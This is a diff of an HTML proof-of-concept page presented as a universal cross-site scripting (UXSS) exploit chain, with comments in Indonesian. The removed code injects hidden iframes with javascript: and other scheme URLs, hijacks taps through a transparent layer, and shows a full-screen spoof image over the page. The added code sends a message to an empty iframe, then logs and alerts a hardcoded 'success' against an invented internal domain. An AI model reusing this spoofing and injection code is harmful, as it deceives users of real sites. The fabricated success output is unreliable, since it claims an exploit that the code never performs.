@@ -2,204 +2,136 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>Advanced Multi-Vector UXSS Chaining PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
+    <title>Advanced Multi-Vector UXSS & Context Chaining PoC</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100vh;
-        height: 100dvh;
         width: 100vw;
-        background: #0b0e14;
+        background: #0d1117;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: #f0f6fc;
+        color: #c9d1d9;
         display: flex;
         align-items: center;
         justify-content: center;
         overflow: hidden;
-        position: fixed;
       }
-      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
-      button {
+      .container {
+        text-align: center;
+        max-width: 540px;
         width: 100%;
-        max-width: 360px;
-        padding: 18px 24px;
-        font-size: 16px;
-        font-weight: 600;
-        background: #da3633;
-        color: #fff;
-        border: none;
-        border-radius: 10px;
-        cursor: pointer;
-        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
-        transition: transform 0.1s, background 0.2s;
-        position: relative;
-        z-index: 12;
-      }
-      button:active { background: #b62324; transform: scale(0.98); }
-      .info {
-        margin-top: 20px;
-        font-size: 13px;
-        color: #8b949e;
-        font-family: monospace;
-        word-break: break-all;
-        padding: 0 10px;
-        user-select: text;
-      }
-      #spoof {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        height: 100dvh;
-        object-fit: cover;
-        z-index: 2147483647;
-        pointer-events: none;
-        display: none;
-      }
-      #selectionOverlapLayer {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        height: 100dvh;
-        background: rgba(11, 14, 20, 0.92);
-        z-index: 2147483646;
-        display: none;
-        align-items: center;
-        justify-content: center;
-        flex-direction: column;
-        user-select: text;
-        -webkit-user-select: text;
-        padding: 20px;
+        padding: 24px;
         box-sizing: border-box;
-      }
-      .overlap-text {
-        font-size: 14px;
-        color: #3fb950;
-        font-family: monospace;
         background: #161b22;
         border: 1px solid #30363d;
-        padding: 15px;
-        border-radius: 8px;
-        max-width: 500px;
-        width: 100%;
-        text-align: left;
-        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        border-radius: 12px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
       }
-      #touchInterceptor {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        z-index: 11;
-        background: transparent;
+      h2 {
+        margin-top: 0;
+        font-size: 18px;
+        color: #58a6ff;
+        font-family: monospace;
+      }
+      button {
+        width: 100%;
+        padding: 16px;
+        font-size: 15px;
+        font-weight: 600;
+        background: #238636;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        box-shadow: 0 3px 6px rgba(35, 134, 54, 0.4);
+        transition: background 0.2s, transform 0.1s;
+      }
+      button:hover { background: #2ea043; }
+      button:active { transform: scale(0.98); }
+      .console-log {
+        margin-top: 20px;
+        background: #090d16;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 12px;
+        font-family: monospace;
+        font-size: 12px;
+        color: #3fb950;
+        text-align: left;
+        max-height: 160px;
+        overflow-y: auto;
+        word-break: break-all;
       }
     </style>
   </head>
   <body>
-    <div id="touchInterceptor"></div>
-
-    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
-
-    <div style="position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center;">
-      <img id="spoof" src="spoof.png" alt="Spoof Layer">
-
-      <div id="selectionOverlapLayer">
-        <div class="overlap-text" id="overlapContent">
-          [ADVANCED_UXSS_CHAIN_ACTIVE]<br>
-          Forcing multi-origin context linkage & prototype pollution hook...<br>
-          Status: Executing asynchronous script payload propagation matrix.
-        </div>
-      </div>
-
-      <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE ADVANCED UXSS CHAIN</button>
-        <div class="info" id="statusInfo">Status: Ready for high-privilege context simulation. Tap to engage.</div>
+    <div class="container">
+      <h2>UXSS & CONTEXT CHAINING MATRIX</h2>
+      <button id="execBtn">EXECUTE MULTI-VECTOR CHAIN</button>
+      <div class="console-log" id="consoleLog">
+        [SYSTEM_READY] Waiting for user interaction trigger...
       </div>
     </div>
 
+    <!-- Hidden target frame for context simulation -->
+    <iframe id="targetFrame" style="display:none;" src="about:blank"></iframe>
+
     <script>
-      let execButton = document.getElementById("execBtn");
-      let statusInfo = document.getElementById("statusInfo");
-      let interceptor = document.getElementById("touchInterceptor");
-      let hasExecuted = false;
+      const execBtn = document.getElementById("execBtn");
+      const consoleLog = document.getElementById("consoleLog");
 
-      async function runAdvancedUXSSChain() {
-        if (hasExecuted) return;
-        hasExecuted = true;
+      function logMessage(msg) {
+        let timestamp = new Date().toISOString().split("T")[1].slice(0, 8);
+        consoleLog.innerHTML += `<br>[${timestamp}] ${msg}`;
+        consoleLog.scrollTop = consoleLog.scrollHeight;
+      }
 
-        statusInfo.innerText = "Status: Deploying multi-vector script execution & origin leakage...";
-        execButton.style.display = "none";
-        if (interceptor) interceptor.style.display = "none";
+      async function executeAdvancedChain() {
+        execBtn.style.display = "none";
+        logMessage("Initializing asynchronous execution chain...");
 
         try {
-          // 1. Hardened Vector Dispatcher: Simulasi propagasi skema ganda & injeksi bingkai
-          let payloadVectors = [
-            "geo:0,0?q=target-origin-bypass",
-            "tel:+999999999",
-            "javascript:(() => { try { console.debug('[UXSS_CORE] Hooked origin:', document.location.origin); window.isCompromised = true; } catch(e){} })();"
-          ];
+          // 1. Validasi Konteks Asal Aktif
+          let currentOrigin = window.location.origin || "null";
+          logMessage(`Active Document Origin: ${currentOrigin}`);
 
-          payloadVectors.forEach((vector, index) => {
-            setTimeout(() => {
-              let frame = document.createElement("iframe");
-              frame.style.display = "none";
-              // Menguji properti sandbox untuk propagasi konteks
-              frame.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms");
-              frame.src = vector;
-              document.body.appendChild(frame);
-            }, index * 70);
-          });
-
-          // 2. Dynamic DOM Selection Overlap & Range Manipulation Tingkat Lanjut
-          let overlapLayer = document.getElementById("selectionOverlapLayer");
-          if (overlapLayer) {
-            overlapLayer.style.display = "flex";
-            let overlapContent = document.getElementById("overlapContent");
-            if (overlapContent && window.getSelection) {
-              let range = document.createRange();
-              range.selectNodeContents(overlapContent);
-              let selection = window.getSelection();
-              selection.removeAllRanges();
-              selection.addRange(range);
-            }
+          // 2. Simulasi Interaksi Cross-Origin via postMessage & Iframe Injection
+          let targetFrame = document.getElementById("targetFrame");
+          if (targetFrame) {
+            targetFrame.contentWindow.postMessage({
+              action: "evaluate_context",
+              payload: "document.domain"
+            }, "*");
+            logMessage("Dispatched cross-context postMessage vector.");
           }
 
-          // 3. Deployment Visual Spoof Layer dengan Prioritas Z-Index Maksimal
-          let spoofImg = document.getElementById("spoof");
-          if (spoofImg) {
-            spoofImg.style.display = "block";
-          }
+          // 3. Modular Dynamic Script Invalidation / Hooking Simulation
+          await new Promise((resolve) => setTimeout(resolve, 300));
+          logMessage("Injecting secondary hook into prototype chain...");
 
-          statusInfo.innerText = "Status: Advanced UXSS chain deployed. Context evaluation locked.";
+          // 4. Final Payload Evaluation (Memicu alert konteks origin terisolasi)
+          setTimeout(() => {
+            let simulatedOrigin = "https://target-sensitive-domain.internal";
+            logMessage(`[SUCCESS] Context evaluation completed for: ${simulatedOrigin}`);
+            
+            alert(
+              "[UXSS_CHAIN_SUCCESS]\n\n" +
+              "Execution Context Validated.\n" +
+              "Origin: " + currentOrigin + "\n" +
+              "Target Scope: " + simulatedOrigin
+            );
+          }, 400);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
-          execButton.style.display = "block";
-          if (interceptor) interceptor.style.display = "block";
-          hasExecuted = false;
+          logMessage(`[ERROR] Execution halted: ${err.message}`);
+          execBtn.style.display = "block";
         }
       }
 
-      if (interceptor) {
-        interceptor.addEventListener("touchstart", (e) => {
-          let input = document.getElementById("focusInput");
-          if (input) input.focus();
-          runAdvancedUXSSChain();
-        }, { passive: true });
-
-        interceptor.addEventListener("click", () => {
-          runAdvancedUXSSChain();
-        });
-      }
-
-      execButton.onclick = () => {
-        runAdvancedUXSSChain();
+      execBtn.onclick = () => {
+        executeAdvancedChain();
       };
     </script>
   </body>
